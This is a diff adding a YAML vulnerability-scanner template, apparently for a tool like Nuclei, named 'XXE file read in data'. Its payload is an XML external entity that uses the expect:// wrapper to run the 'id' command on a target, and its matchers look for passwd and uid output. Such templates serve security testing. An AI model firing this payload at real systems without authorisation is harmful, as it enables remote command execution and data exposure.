@@ -1,0 +1,23 @@
+id: xxe2-067
+name: 'XXE file read in data'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via data'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      data:
+        - '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "expect://id">]><r>&xxe;</r>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'XXE_OK'
+          - 'localhost'
+          - 'uid='
